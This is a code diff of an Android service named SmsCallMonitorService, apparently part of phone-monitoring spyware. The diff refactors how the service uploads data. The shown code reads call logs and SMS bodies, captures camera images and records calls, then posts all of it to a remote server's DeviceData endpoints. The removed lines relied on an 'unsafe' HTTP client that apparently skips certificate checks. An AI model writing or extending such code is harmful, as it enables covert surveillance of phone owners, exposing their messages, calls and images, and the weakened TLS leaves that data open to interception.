@@ -18,13 +18,11 @@ import android.os.HandlerThread
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import android.Manifest
-import com.example.bullsseeclient.HttpClient
-import okhttp3.RequestBody
-import retrofit2.Retrofit
-import retrofit2.converter.gson.GsonConverterFactory
+import com.example.bullsseeclient.api.ApiClient
+import com.example.bullsseeclient.api.CallDto
+import com.example.bullsseeclient.api.SmsDto
+import com.example.bullsseeclient.api.ImageDto
 import java.time.Instant
-import com.google.gson.annotations.SerializedName
-import android.provider.Telephony
 import android.provider.MediaStore
 import android.util.Base64
 import android.content.ContentUris
@@ -36,9 +34,8 @@ import android.media.MediaRecorder
 import android.media.AudioManager
 import java.io.File
 import okhttp3.MultipartBody
-import okhttp3.RequestBody.Companion.toRequestBody
-import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 
 class SmsCallMonitorService : Service() {
     private var observerThread: HandlerThread? = null
@@ -54,6 +51,7 @@ class SmsCallMonitorService : Service() {
     private var recorder: MediaRecorder? = null
     private var recordingFile: File? = null
     private var callActive: Boolean = false
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
@@ -241,15 +239,7 @@ class SmsCallMonitorService : Service() {
 
     private fun sendCallEventFromLog(dto: CallDto) {
         android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=${dto.number} date=${dto.date} type=${dto.type} duration=${dto.duration}")
-        val retrofit = Retrofit.Builder()
-            .baseUrl(HttpClient.BASE_URL)
-            .addConverterFactory(GsonConverterFactory.create())
-            .client(HttpClient.getUnsafeOkHttpClient())
-            .build()
-        val api = retrofit.create(Api::class.java)
-        val payload = listOf(dto)
-        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
-        api.send(body).enqueue(object : retrofit2.Callback<Void> {
+        ApiClient.api.sendCallLogs(listOf(dto)).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {
                 android.util.Log.d("SmsCallMonitorService", "upload status=${response.code()}")
             }
@@ -332,15 +322,7 @@ class SmsCallMonitorService : Service() {
     }
 
     private fun sendSmsEvent(dto: SmsDto) {
-        val retrofit = Retrofit.Builder()
-            .baseUrl(HttpClient.BASE_URL)
-            .addConverterFactory(GsonConverterFactory.create())
-            .client(HttpClient.getUnsafeOkHttpClient())
-            .build()
-        val api = retrofit.create(ApiSms::class.java)
-        val payload = listOf(dto)
-        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
-        api.send(body).enqueue(object : retrofit2.Callback<Void> {
+        ApiClient.api.sendSmsLogs(listOf(dto)).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
             override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
         })
@@ -381,15 +363,7 @@ class SmsCallMonitorService : Service() {
     }
 
     private fun sendImageEvent(dto: ImageDto) {
-        val retrofit = Retrofit.Builder()
-            .baseUrl(HttpClient.BASE_URL)
-            .addConverterFactory(GsonConverterFactory.create())
-            .client(HttpClient.getUnsafeOkHttpClient())
-            .build()
-        val api = retrofit.create(ApiImage::class.java)
-        val payload = listOf(dto)
-        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
-        api.send(body).enqueue(object : retrofit2.Callback<Void> {
+        ApiClient.api.sendCameraImages(listOf(dto)).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
             override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
         })
@@ -402,13 +376,7 @@ class SmsCallMonitorService : Service() {
         date: okhttp3.RequestBody,
         duration: okhttp3.RequestBody
     ) {
-        val retrofit = Retrofit.Builder()
-            .baseUrl(HttpClient.BASE_URL)
-            .addConverterFactory(GsonConverterFactory.create())
-            .client(HttpClient.getUnsafeOkHttpClient())
-            .build()
-        val api = retrofit.create(ApiRecordingMultipart::class.java)
-        api.send(filePart, number, type, date, duration).enqueue(object : retrofit2.Callback<Void> {
+        ApiClient.api.sendCallRecording(filePart, number, type, date, duration).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
             override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
         })
@@ -456,60 +424,6 @@ class SmsCallMonitorService : Service() {
         observerThread?.quitSafely()
         telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
     }
-
-    interface Api {
-        @retrofit2.http.POST("api/DeviceData/calllog")
-        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
-    }
-
-    interface ApiSms {
-        @retrofit2.http.POST("api/DeviceData/smslog")
-        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
-    }
-
-    interface ApiImage {
-        @retrofit2.http.POST("api/DeviceData/cameraImage")
-        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
-    }
-
-    interface ApiRecordingMultipart {
-        @retrofit2.http.Multipart
-        @retrofit2.http.POST("api/DeviceData/callRecording")
-        fun send(
-            @retrofit2.http.Part file: MultipartBody.Part,
-            @retrofit2.http.Part("Number") number: okhttp3.RequestBody,
-            @retrofit2.http.Part("Type") type: okhttp3.RequestBody,
-            @retrofit2.http.Part("Date") date: okhttp3.RequestBody,
-            @retrofit2.http.Part("Duration") duration: okhttp3.RequestBody
-        ): retrofit2.Call<Void>
-    }
-
-    data class CallDto(
-        @SerializedName("Number") val number: String?,
-        @SerializedName("Date") val date: String,
-        @SerializedName("Type") val type: String,
-        @SerializedName("Duration") val duration: Int?
-    )
-
-    data class SmsDto(
-        @SerializedName("Address") val address: String?,
-        @SerializedName("Body") val body: String?,
-        @SerializedName("Type") val type: String,
-        @SerializedName("Date") val date: String
-    )
-
-    data class ImageDto(
-        val base64Image: String,
-        val timestamp: String
-    )
-
-    data class CallRecordingDto(
-        val audioBase64: String,
-        val number: String?,
-        val type: String?,
-        val date: String?,
-        val duration: Int?
-    )
 
     companion object {
         fun start(context: Context) {
